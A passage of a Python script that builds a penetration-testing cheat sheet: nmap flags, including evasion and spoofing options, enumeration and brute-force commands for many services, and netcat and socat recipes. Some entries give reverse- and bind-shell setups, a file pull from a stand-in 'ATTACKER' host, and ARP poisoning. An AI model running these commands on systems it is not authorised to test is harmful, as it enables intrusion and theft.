        ("--script=dns-brute", "DNS hostname brute force.", "nmap --script=dns-brute 10.0.0.1"),
        ("--script=ftp-anon", "Check anonymous FTP.", "nmap --script=ftp-anon -p21 10.0.0.1"),
        ("--script=ssh-auth-methods", "List SSH auth methods.", "nmap --script=ssh-auth-methods -p22 10.0.0.1"),
        ("--script=snmp-brute", "SNMP community brute.", "nmap --script=snmp-brute -sU -p161 10.0.0.1"),
        ("--script=mysql-info", "MySQL information.", "nmap --script=mysql-info -p3306 10.0.0.1"),
        ("--script=rdp-enum-encryption", "RDP security settings.", "nmap --script=rdp-enum-encryption -p3389 10.0.0.1"),
        ("--script=whois-ip", "WHOIS IP lookup.", "nmap --script=whois-ip 10.0.0.1"),
        ("--script \"default and safe\"", "Boolean expression of categories.", 'nmap --script "default and safe" 10.0.0.1'),
        ("--script-timeout", "Per-script max runtime.", "nmap --script-timeout 3m --script=vuln 10.0.0.1"),
    ]
    OUT = [
        ("-oN <file>", "Normal human-readable output.", "nmap -oN scan.txt 10.0.0.1"),
        ("-oX <file>", "XML output.", "nmap -oX scan.xml 10.0.0.1"),
        ("-oG <file>", "Grepable output.", "nmap -oG scan.gnmap 10.0.0.1"),
        ("-oS <file>", "Script kiddie (humorous) format.", "nmap -oS l33t.txt 10.0.0.1"),
        ("-oA <base>", "All major formats (N, X, G).", "nmap -oA scan 10.0.0.1"),
        ("--open", "Show only open (or open|filtered) ports.", "nmap --open -p- 10.0.0.1"),
        ("-v", "Verbose level 1.", "nmap -v 10.0.0.1"),
        ("-vv", "Extra verbose.", "nmap -vv 10.0.0.1"),
        ("-d", "Debug (repeat for more).", "nmap -d 10.0.0.1"),
        ("--reason", "Show reason for port state.", "nmap --reason -p 22 10.0.0.1"),
        ("--packet-trace", "Packet-level trace to stdout.", "nmap --packet-trace -p 80 10.0.0.1"),
        ("--iflist", "List interfaces (diagnostic).", "nmap --iflist"),
    ]
    EV = [
        ("-f", "Fragment IP packets.", "nmap -f 10.0.0.1"),
        ("--mtu <n>", "Use given MTU (implies frag).", "nmap --mtu 16 10.0.0.1"),
        ("-D RND:10,ME", "Decoy scan with random decoys.", "nmap -D RND:10,ME 10.0.0.1"),
        ("-S <IP>", "Spoof source IP.", "nmap -S 192.168.1.50 10.0.0.1"),
        ("--source-port <p>", "Spoof source port.", "nmap --source-port 53 -p 80 10.0.0.1"),
        ("-g <p>", "Same as --source-port.", "nmap -g 53 10.0.0.1"),
        ("--data-length <n>", "Append random data to probes.", "nmap --data-length 24 10.0.0.1"),
        ("--ttl <n>", "Set IPv4 TTL.", "nmap --ttl 128 10.0.0.1"),
        ("--badsum", "Send packets with bad checksums.", "nmap --badsum 10.0.0.1"),
        ("--ip-options", "Loose/strict source route etc.", 'nmap --ip-options "R" 10.0.0.1'),
        ("--spoof-mac <vendor|0|random>", "Spoof MAC address.", "nmap --spoof-mac Apple 10.0.0.1"),
        ("--proxies <url,...>", "Relay TCP via HTTP/SOCKS4/SOCKS5.", "nmap --proxies http://127.0.0.1:8080 10.0.0.1"),
        ("--data-string <str>", "Append custom string to packets.", 'nmap --data-string "GET /" -p80 10.0.0.1'),
        ("--adler32", "Use Adler32 instead of CRC32C (SCTP).", "nmap -sY --adler32 -p 38412 10.0.0.1"),
        ("--scan-delay", "Slow probes (IDS evasion).", "nmap --scan-delay 1s 10.0.0.1"),
    ]

    def pack(rows):
        return [ce(*t) for t in rows]

    return [
        {"title": "Host Discovery", "items": pack(HD)},
        {"title": "Scan Techniques", "items": pack(ST)},
        {"title": "Port Specification", "items": pack(PS)},
        {"title": "Service / Version Detection", "items": pack(SV)},
        {"title": "OS Detection", "items": pack(OS)},
        {"title": "Timing & Performance", "items": pack(TM)},
        {"title": "NSE Scripts", "items": pack(NSE)},
        {"title": "Output", "items": pack(OUT)},
        {"title": "Firewall Evasion", "items": pack(EV)},
    ]


def build_service_enum():
    rows_ftp = [
        ("ftp client", "Interactive FTP session.", "ftp 10.0.0.1"),
        ("anonymous", "Try anonymous:anonymous.", "ftp 10.0.0.1"),
        ("banner (nc)", "Grab FTP banner.", "nc -vn 10.0.0.1 21"),
        ("curl FTPS", "Test explicit TLS FTP.", "curl -vk ftps://10.0.0.1"),
        ("nmap ftp scripts", "NSE FTP checks.", "nmap --script=ftp-anon,ftp-bounce -p21 10.0.0.1"),
        ("hydra", "FTP password spray.", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.1"),
        ("medusa", "Alternate FTP brute.", "medusa -h 10.0.0.1 -u admin -P pass.txt -M ftp"),
        ("nmap bounce", "FTP bounce scan test.", "nmap -b user:pass@10.0.0.1:21 10.0.0.2"),
        ("wget mirror", "Mirror if anonymous allowed.", "wget -m ftp://anonymous:anonymous@10.0.0.1/"),
        ("lftp", "Batch FTP / mirror.", "lftp ftp://10.0.0.1"),
        ("searchsploit", "Match version to local exploits.", "searchsploit pure-ftpd"),
    ]
    rows_ssh = [
        ("banner", "SSH version string.", "nc -vn 10.0.0.1 22"),
        ("ssh-keyscan", "Collect host keys.", "ssh-keyscan 10.0.0.1"),
        ("ssh-audit", "Weak algorithms audit.", "ssh-audit 10.0.0.1"),
        ("hydra ssh", "SSH brute force.", "hydra -L users.txt -P pass.txt ssh://10.0.0.1"),
        ("medusa ssh", "SSH brute.", "medusa -h 10.0.0.1 -U users.txt -P pass.txt -M ssh"),
        ("nmap ssh-auth-methods", "List auth methods.", "nmap --script ssh-auth-methods -p22 10.0.0.1"),
        ("nmap ssh-hostkey", "Grab hostkey.", "nmap --script ssh-hostkey -p22 10.0.0.1"),
        ("nmap ssh2-enum-algos", "Enumerate algorithms.", "nmap --script ssh2-enum-algos -p22 10.0.0.1"),
        ("patator", "Username oracle (tune ignore).", "patator ssh_login host=10.0.0.1 user=FILE0 password=x 0=users.txt"),
        ("masscan", "Fast port then banner.", "masscan 10.0.0.1 -p22 --rate=1000"),
    ]
    rows_smb = [
        ("smbclient -L", "Null session share list.", "smbclient -L //10.0.0.1 -N"),
        ("smbclient share", "Connect to share.", "smbclient //10.0.0.1/SHARE -U user%pass"),
        ("smbmap", "Share permissions map.", "smbmap -H 10.0.0.1"),
        ("crackmapexec", "Auth / enumerate / exec.", "crackmapexec smb 10.0.0.1"),
        ("enum4linux", "Classic SMB enum.", "enum4linux -a 10.0.0.1"),
        ("rpcclient null", "RPC null session.", 'rpcclient -U "" -N 10.0.0.1'),
        ("rpcclient users", "List domain users if allowed.", 'rpcclient -U "" -N 10.0.0.1 -c enumdomusers'),
        ("nmap smb-enum-shares", "NSE share enum.", "nmap --script smb-enum-shares -p445 10.0.0.1"),
        ("nmap smb-enum-users", "NSE user enum.", "nmap --script smb-enum-users -p445 10.0.0.1"),
        ("nmap smb-os-discovery", "OS via SMB.", "nmap --script smb-os-discovery -p445 10.0.0.1"),
        ("nmap ms17-010", "EternalBlue-style check.", "nmap --script smb-vuln-ms17-010 -p445 10.0.0.1"),
        ("lookupsid", "SID / users (impacket).", "lookupsid.py guest@10.0.0.1"),
        ("secretsdump", "DCSync style (needs creds).", "secretsdump.py domain/user:pass@10.0.0.1"),
        ("smbget", "Recursive download.", "smbget -R smb://user:pass@10.0.0.1/share"),
        ("showmount", "NFS exports (adjacent).", "showmount -e 10.0.0.1"),
    ]
    rows_http = [
        ("curl -I", "Response headers.", "curl -sI http://10.0.0.1"),
        ("gobuster", "Directory brute.", "gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt"),
        ("ffuf", "Fast web fuzz.", "ffuf -u http://10.0.0.1/FUZZ -w wordlist.txt"),
        ("nikto", "Web server scan.", "nikto -h http://10.0.0.1"),
        ("whatweb", "Tech fingerprint.", "whatweb http://10.0.0.1"),
        ("wfuzz", "Parameter fuzzing.", "wfuzz -c -z file,wordlist.txt http://10.0.0.1?id=FUZZ"),
        ("dirsearch", "Python dir brute.", "dirsearch -u http://10.0.0.1"),
        ("feroxbuster", "Recursive discovery.", "feroxbuster -u http://10.0.0.1 -w wordlist.txt"),
        ("httpx", "Probe many hosts.", "httpx -l hosts.txt -title -tech-detect"),
        ("curl POST", "Test login form.", 'curl -d "user=admin&pass=test" http://10.0.0.1/login'),
        ("nmap http-enum", "NSE path enum.", "nmap --script http-enum -p80 10.0.0.1"),
        ("nmap http-methods", "HTTP methods.", "nmap --script http-methods -p80 10.0.0.1"),
        ("nmap ssl-enum-ciphers", "HTTPS ciphers.", "nmap --script ssl-enum-ciphers -p443 10.0.0.1"),
        ("wpscan", "WordPress audit.", "wpscan --url http://10.0.0.1"),
        ("arjun", "Hidden HTTP params.", "arjun -u http://10.0.0.1/api"),
    ]
    rows_dns = [
        ("dig A", "Resolve A record.", "dig +short A example.com @8.8.8.8"),
        ("dig AXFR", "Zone transfer attempt.", "dig axfr @ns1.example.com example.com"),
        ("nslookup", "Basic lookup.", "nslookup example.com 8.8.8.8"),
        ("dnsrecon", "DNS reconnaissance.", "dnsrecon -d example.com"),
        ("dnsenum", "Enumerate DNS.", "dnsenum example.com"),
        ("fierce", "Subdomain brute.", "fierce --domain example.com"),
        ("host -l", "Zone transfer via host.", "host -l example.com ns1.example.com"),
        ("dig ANY", "ANY query (often blocked).", "dig +noall +answer ANY example.com"),
        ("dig TXT", "SPF / DMARC.", "dig TXT _dmarc.example.com"),
        ("nmap dns-brute", "NSE DNS brute.", "nmap --script dns-brute --script-args dns-brute.domain=example.com"),
    ]
    rows_smtp = [
        ("nc banner", "SMTP banner.", "nc -vn 10.0.0.1 25"),
        ("VRFY", "Verify user (if allowed).", "echo VRFY root | nc 10.0.0.1 25"),
        ("EXPN", "Expand list (if allowed).", "echo EXPN all | nc 10.0.0.1 25"),
        ("swaks RCPT", "User existence via RCPT.", "swaks --to user@dom.com --server 10.0.0.1"),
        ("swaks send", "Send test mail.", "swaks --to test@test.com --from a@test.com --server 10.0.0.1"),
        ("nmap smtp-commands", "Enumerate SMTP commands.", "nmap --script smtp-commands -p25 10.0.0.1"),
        ("nmap smtp-open-relay", "Open relay test.", "nmap --script smtp-open-relay -p25 10.0.0.1"),
        ("nmap smtp-enum-users", "SMTP user enum.", "nmap --script smtp-enum-users -p25 10.0.0.1"),
        ("msf smtp_enum", "MSF SMTP user enum.", 'msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS 10.0.0.1; run"'),
        ("openssl s_client", "SMTPS handshake.", "openssl s_client -connect 10.0.0.1:465 -crlf"),
    ]
    rows_snmp = [
        ("snmpwalk v2c", "Walk with community.", "snmpwalk -v2c -c public 10.0.0.1"),
        ("snmpwalk v1", "SNMPv1 walk.", "snmpwalk -v1 -c public 10.0.0.1"),
        ("snmp-check", "Kali SNMP audit.", "snmp-check 10.0.0.1 -c public"),
        ("onesixtyone", "Community brute.", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.1"),
        ("braa", "Fast SNMP brute.", "braa public@10.0.0.1:.1.3.6.1.2.1.1"),
        ("nmap snmp-info", "SNMP system info.", "nmap -sU -p161 --script snmp-info 10.0.0.1"),
        ("nmap snmp-brute", "Community brute (NSE).", "nmap -sU -p161 --script snmp-brute 10.0.0.1"),
        ("snmpget sysDescr", "Single OID.", "snmpget -v2c -c public 10.0.0.1 1.3.6.1.2.1.1.1.0"),
        ("snmpbulkwalk", "Bulk walk.", "snmpbulkwalk -v2c -c public 10.0.0.1"),
        ("hydra snmp", "Brute SNMP creds.", "hydra -P pass.txt snmp://10.0.0.1"),
    ]
    rows_ldap = [
        ("ldapsearch anon", "Anonymous base search.", 'ldapsearch -x -H ldap://10.0.0.1 -b "" -s base'),
        ("ldapsearch users", "Search users (set base).", 'ldapsearch -x -H ldap://10.0.0.1 -b "dc=domain,dc=local" "(objectClass=user)"'),
        ("ldapdomaindump", "AD LDAP dump.", "ldapdomaindump ldap://10.0.0.1 -u domain\\\\user -p pass"),
        ("windapsearch", "Windows AD LDAP enum.", "windapsearch --dc-ip 10.0.0.1 -u user -p pass --users"),
        ("nmap ldap-search", "NSE LDAP queries.", "nmap --script ldap-search -p389 10.0.0.1"),
        ("nmap ldap-rootdse", "RootDSE info.", "nmap --script ldap-rootdse -p389 10.0.0.1"),
        ("ldapsearch groups", "List groups.", 'ldapsearch -x -H ldap://10.0.0.1 -b "dc=x,dc=y" "(objectClass=group)"'),
        ("ldaps", "LDAP over TLS.", "ldapsearch -x -H ldaps://10.0.0.1"),
        ("bloodhound.py", "BloodHound ingest (creds).", "bloodhound-python -u user -p pass -d domain.local -ns 10.0.0.1 -c all"),
        ("enum4linux -l", "LDAP via enum4linux.", "enum4linux -l 10.0.0.1"),
    ]
    rows_mysql = [
        ("mysql client", "Interactive login.", "mysql -h 10.0.0.1 -u root -p"),
        ("nmap mysql-info", "Version / variables.", "nmap --script mysql-info -p3306 10.0.0.1"),
        ("nmap mysql-empty-password", "Empty password check.", "nmap --script mysql-empty-password -p3306 10.0.0.1"),
        ("nmap mysql-users", "Enumerate users (auth).", "nmap --script mysql-users --script-args mysqluser=root,mysqlpass= -p3306 10.0.0.1"),
        ("hydra mysql", "Brute MySQL.", "hydra -l root -P pass.txt mysql://10.0.0.1"),
        ("mysqlshow", "List databases.", "mysqlshow -h 10.0.0.1 -u root -p"),
        ("mysqldump", "Dump DB (perms).", "mysqldump -h 10.0.0.1 -u root -p --all-databases"),
        ("searchsploit mysql", "Exploit-db match.", "searchsploit mysql 5.7"),
        ("msf mysql_version", "Version scanner.", 'msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS 10.0.0.1; run"'),
        ("tshark", "Capture MySQL on wire.", 'tshark -i eth0 -f "tcp port 3306"'),
    ]
    rows_mssql = [
        ("mssqlclient", "SQL shell (impacket).", "mssqlclient.py domain/user:pass@10.0.0.1"),
        ("sqsh", "Interactive SQL.", "sqsh -S 10.0.0.1 -U sa -P pass"),
        ("nmap ms-sql-info", "MSSQL info.", "nmap --script ms-sql-info -p1433 10.0.0.1"),
        ("nmap ms-sql-empty-password", "Sa empty password.", "nmap --script ms-sql-empty-password -p1433 10.0.0.1"),
        ("nmap ms-sql-brute", "Brute MSSQL.", "nmap --script ms-sql-brute -p1433 10.0.0.1"),
        ("hydra mssql", "Hydra brute.", "hydra -l sa -P pass.txt mssql://10.0.0.1"),
        ("msf mssql_login", "MSF login scanner.", 'msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS 10.0.0.1; run"'),
        ("sqlcmd", "Microsoft CLI.", 'sqlcmd -S 10.0.0.1 -U sa -P pass -Q "SELECT @@version"'),
        ("mssqlinstance", "Instance enum (impacket).", "mssqlinstance.py 10.0.0.1"),
        ("nmap ms-sql-config", "Retrieve config (auth).", "nmap --script ms-sql-config --script-args mssql.username=sa,mssql.password=pass -p1433 10.0.0.1"),
    ]
    rows_pg = [
        ("psql", "Interactive client.", "psql -h 10.0.0.1 -U postgres"),
        ("nmap pgsql-brute", "Brute postgres.", "nmap --script pgsql-brute -p5432 10.0.0.1"),
        ("hydra postgres", "Hydra brute.", "hydra -l postgres -P pass.txt postgres://10.0.0.1"),
        ("pg_dump", "Dump database.", "pg_dump -h 10.0.0.1 -U postgres dbname"),
        ("psql -l", "List databases.", "psql -h 10.0.0.1 -U postgres -l"),
        ("searchsploit postgresql", "Exploit-db match.", "searchsploit postgresql"),
        ("msf postgres_version", "Version scan.", 'msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS 10.0.0.1; run"'),
        ("COPY FROM PROGRAM", "Dangerous feature (authorized).", 'psql -h 10.0.0.1 -U postgres -c "SELECT 1"'),
        ("nmap pgsql-tables", "List tables (auth).", "nmap --script pgsql-tables --script-args pgsql.user=postgres,pgsql.pass= -p5432 10.0.0.1"),
        ('psql sslmode=require', "Force TLS.", 'psql "host=10.0.0.1 sslmode=require user=postgres"'),
    ]
    rows_rdp = [
        ("nmap rdp-enum-encryption", "RDP security settings.", "nmap --script rdp-enum-encryption -p3389 10.0.0.1"),
        ("nmap rdp-ntlm-info", "NTLM info leak.", "nmap --script rdp-ntlm-info -p3389 10.0.0.1"),
        ("xfreerdp", "Connect to desktop.", "xfreerdp /v:10.0.0.1 /u:user /p:pass"),
        ("rdesktop", "Legacy RDP client.", "rdesktop 10.0.0.1"),
        ("hydra rdp", "Brute RDP.", "hydra -l admin -P pass.txt rdp://10.0.0.1"),
    ]
    rows_vnc = [
        ("nmap vnc-info", "VNC fingerprint.", "nmap --script vnc-info -p5900 10.0.0.1"),
        ("vncviewer", "Connect to VNC.", "vncviewer 10.0.0.1:5900"),
        ("hydra vnc", "Brute VNC password.", "hydra -P pass.txt -s 5900 10.0.0.1 vnc"),
        ("searchsploit vnc", "Exploit-db match.", "searchsploit vnc"),
        ("nmap realvnc-auth-bypass", "Historical check.", "nmap -p5900 --script realvnc-auth-bypass 10.0.0.1"),
    ]
    rows_winrm = [
        ("evil-winrm", "PowerShell over WinRM.", "evil-winrm -i 10.0.0.1 -u user -p pass"),
        ("crackmapexec winrm", "Test auth / command.", "crackmapexec winrm 10.0.0.1 -u user -p pass"),
        ("nmap winrm-enum-users", "Enumerate users.", "nmap --script winrm-enum-users -p5985 10.0.0.1"),
        ("nmap http-title", "WinRM HTTP probe.", "nmap -p5985,5986 --script http-title 10.0.0.1"),
        ("msf winrm_login", "Brute WinRM.", 'msfconsole -q -x "use auxiliary/scanner/winrm/winrm_login; set RHOSTS 10.0.0.1; run"'),
    ]
    rows_redis = [
        ("redis-cli", "Interactive Redis.", "redis-cli -h 10.0.0.1"),
        ("redis-cli INFO", "Server info.", "redis-cli -h 10.0.0.1 INFO"),
        ("nmap redis-info", "Redis NSE info.", "nmap --script redis-info -p6379 10.0.0.1"),
        ("nmap redis-brute", "Brute AUTH.", "nmap --script redis-brute -p6379 10.0.0.1"),
        ("SLAVEOF test", "Replication abuse (authorized).", "redis-cli -h 10.0.0.1 SLAVEOF host port"),
    ]
    rows_mongo = [
        ("mongosh", "Mongo shell.", "mongosh mongodb://10.0.0.1:27017"),
        ("nmap mongodb-databases", "List DBs (no auth).", "nmap --script mongodb-databases -p27017 10.0.0.1"),
        ("nmap mongodb-brute", "Brute credentials.", "nmap --script mongodb-brute -p27017 10.0.0.1"),
        ("mongoexport", "Export collection.", "mongoexport --uri mongodb://10.0.0.1/db -c col"),
        ("show collections", "List collections.", 'mongosh --eval "db.getCollectionNames()" mongodb://10.0.0.1/test'),
    ]
    rows_mem = [
        ("nc stats", "Memcached stats.", "echo stats | nc 10.0.0.1 11211"),
        ("nmap memcached-info", "NSE memcached info.", "nmap --script memcached-info -p11211 10.0.0.1"),
        ("nmap UDP", "UDP memcached.", "nmap -sU -p11211 --script memcached-info 10.0.0.1"),
        ("stats items", "Slab stats one-liner.", r'python3 -c "import socket;s=socket.create_connection((\"10.0.0.1\",11211));s.send(b\"stats items\\r\\n\");print(s.recv(4096))"'),
        ("searchsploit memcached", "Exploit-db match.", "searchsploit memcached"),
    ]

    def blk(name, rows):
        return {"name": name, "rows": [list(r) for r in rows]}

    return [
        blk("FTP", rows_ftp),
        blk("SSH", rows_ssh),
        blk("SMB", rows_smb),
        blk("HTTP", rows_http),
        blk("DNS", rows_dns),
        blk("SMTP", rows_smtp),
        blk("SNMP", rows_snmp),
        blk("LDAP", rows_ldap),
        blk("MySQL", rows_mysql),
        blk("MSSQL", rows_mssql),
        blk("PostgreSQL", rows_pg),
        blk("RDP", rows_rdp),
        blk("VNC", rows_vnc),
        blk("WinRM", rows_winrm),
        blk("Redis", rows_redis),
        blk("MongoDB", rows_mongo),
        blk("Memcached", rows_mem),
    ]


def build_net_tools():
    nc = [
        ("TCP listener", "Bind listener.", "nc -lvnp 4444"),
        ("UDP listener", "UDP listen.", "nc -u -lvnp 53"),
        ("reverse (attacker)", "Catch reverse shell.", "nc -lvnp 4444"),
        ("file send", "Push file.", "nc -lvnp 4444 < file.bin"),
        ("file recv", "Save file.", "nc ATTACKER 4444 > recv.bin"),
        ("port scan", "TCP connect range.", "nc -zv 10.0.0.1 20-30"),
        ("HTTP GET", "Manual request.", 'printf "GET / HTTP/1.0\\r\\n\\r\\n" | nc 10.0.0.1 80'),
        ("relay fifo", "Two-way relay.", "mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | nc 10.0.0.2 80 > /tmp/f"),
        ("simple proxy", "Forward to backend.", 'nc -lvp 8080 -c "nc 10.0.0.2 80"'),
        ("banner", "Read banner.", "echo | nc -vn 10.0.0.1 22"),
        ("ncat SSL", "TLS connect.", "ncat --ssl 10.0.0.1 443"),
        ("IPv6 listener", "Listen IPv6.", "nc -6 -lvnp 4444"),
        ("hex pipe", "Traffic to hex.", "nc -lvnp 4444 | xxd"),
        ("timeout", "Fail fast.", "nc -w 3 -zv 10.0.0.1 443"),
        ("keep -k", "GNU restart listener.", "nc -lk -vp 4444"),
    ]
    socat = [
        ("reverse listener", "Catch shell.", "socat TCP-LISTEN:4444,reuseaddr,fork -"),
        ("OpenSSL server", "Encrypted listener.", "socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork STDIO"),
        ("OpenSSL client", "Encrypted client.", "socat OPENSSL:10.0.0.1:4443,verify=0 STDIO"),
        ("TCP forward", "Local port to remote.", "socat TCP-LISTEN:8080,fork TCP:10.0.0.2:80"),
        ("UDP to TCP", "Protocol bridge.", "socat UDP4-LISTEN:53,fork TCP:127.0.0.1:5353"),
        ("SOCKS4", "Simple SOCKS.", "socat TCP-LISTEN:1080,fork SOCKS4:127.0.0.1:10.0.0.1:22"),
        ("PTY bash", "Stable TTY shell.", "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"),
        ("file send", "Send file.", "socat TCP-LISTEN:4444,fork FILE:secret.bin"),
        ("file recv", "Receive file.", "socat TCP:10.0.0.1:4444 FILE:out.bin,create"),
        ("double relay", "Bridge two ports.", "socat TCP-LISTEN:1111,fork TCP:10.0.0.2:2222"),
    ]
    tcpdump = [
        ("host", "Traffic involving host.", "tcpdump -i eth0 host 10.0.0.1"),
        ("src/dst host", "Directional.", "tcpdump -i eth0 src host 10.0.0.1 and dst host 10.0.0.2"),
        ("port", "TCP/UDP port.", "tcpdump -i eth0 port 80"),
        ("portrange", "Range.", "tcpdump -i eth0 portrange 1-1024"),
        ("tcp", "TCP only.", "tcpdump -i eth0 tcp"),
        ("udp", "UDP only.", "tcpdump -i eth0 udp"),
        ("icmp", "ICMP.", "tcpdump -i eth0 icmp"),
        ("SYN", "TCP SYN.", 'tcpdump -i eth0 "tcp[tcpflags] & tcp-syn != 0"'),
        ("RST/FIN", "Tear-down.", 'tcpdump -i eth0 "tcp[tcpflags] & (tcp-rst|tcp-fin) != 0"'),
        ("DNS", "Port 53.", "tcpdump -i eth0 port 53"),
        ("HTTP payload", "Cleartext HTTP.", "tcpdump -i eth0 -A tcp port 80"),
        ("large packets", "Jumbo hints.", "tcpdump -i eth0 greater 1400"),
        ("write pcap", "Save capture.", "tcpdump -i eth0 -w capture.pcap"),
        ("read pcap", "Read file.", "tcpdump -r capture.pcap"),
        ("verbose", "More decode.", "tcpdump -i eth0 -vv host 10.0.0.1"),
    ]
    wire = [
        ("http", "Cleartext HTTP.", "http"),
        ("http.host", "Host header contains.", 'http.host contains "example"'),
        ("dns", "DNS protocol.", "dns"),
        ("dns.qry.name", "Query name.", 'dns.qry.name contains "internal"'),
        ("tcp.stream", "One conversation.", "tcp.stream eq 0"),
        ("tls.handshake", "ClientHello.", "tls.handshake.type == 1"),
        ("smb", "SMB / SMB2.", "smb || smb2"),
        ("kerberos", "Kerberos.", "kerberos"),
        ("ftp", "FTP.", "ftp"),
        ("smtp", "SMTP.", "smtp"),
        ("telnet", "Telnet.", "telnet"),
        ("arp", "ARP.", "arp"),
        ("icmp", "ICMP.", "icmp"),
        ("frame contains", "ASCII hunt (lab).", 'frame contains "password"'),
        ("http.authorization", "Basic auth header.", "http.authorization"),
    ]
    arp = [
        ("arp-scan local", "Discover LAN.", "sudo arp-scan --localnet"),
        ("arp-scan CIDR", "Scan subnet.", "sudo arp-scan 192.168.1.0/24"),
        ("arping", "IP to MAC.", "sudo arping -I eth0 -c 3 192.168.1.1"),
        ("arpspoof", "ARP poison (lab).", "sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.254"),
        ("ip neigh", "Neighbor table.", "ip neigh show"),
    ]
    recon = [
        ("traceroute", "Classic trace.", "traceroute 8.8.8.8"),
        ("nmap traceroute", "TCP trace.", "nmap --traceroute -Pn -p80 10.0.0.1"),
        ("mtr", "Live path stats.", "mtr -rwzc 100 8.8.8.8"),
        ("fping", "Fast ping sweep.", "fping -a -g 192.168.1.0/24"),
        ("bash ping sweep", "Simple /24.", "for i in {1..254}; do ping -c1 -W1 192.168.1.$i | grep bytes & done"),
        ("nmap -sn", "Live hosts.", "nmap -sn 192.168.1.0/24"),
    ]

    def sec(title, items):
        return {"title": title, "items": [list(t) for t in items]}

    return [
        sec("Netcat", nc),
        sec("Socat", socat),
        sec("Tcpdump filters", tcpdump),
        sec("Wireshark display filters", wire),
        sec("ARP tools", arp),
        sec("Network recon", recon),
    ]


def build_quick_scans():
    return [
        ["Quick TCP", "Default scripts + versions to file.", "nmap -sC -sV -oN scan.txt TARGET"],
        ["Full TCP", "All TCP ports with scripts + versions.", "nmap -p- -sC -sV -oN full.txt TARGET"],
        ["UDP Top 100", "Top 100 UDP ports.", "nmap -sU --top-ports 100 -oN udp.txt TARGET"],
        ["Stealth", "SYN slow + frag + data padding.", "nmap -sS -T2 -f --data-length 24 TARGET"],
        ["Vuln Scan", "NSE vuln category.", "nmap --script=vuln TARGET"],
        ["All-in-One", "Aggressive full-feature all TCP.", "nmap -sC -sV -O -A -p- TARGET"],
        ["Web Enum", "Web ports + http-enum.", "nmap -sV -p 80,443,8080,8443 --script=http-enum TARGET"],
        ["SMB Enum", "SMB scripts wildcard.", "nmap -p 445 --script=smb-enum* TARGET"],
        ["Script Scan", "Default + safe scripts.", "nmap -sC -sV --script=default,safe TARGET"],
        ["Aggressive", "OS + traceroute + fast all ports.", "nmap -A -T4 -p- TARGET"],
    ]


if __name__ == "__main__":
    main()
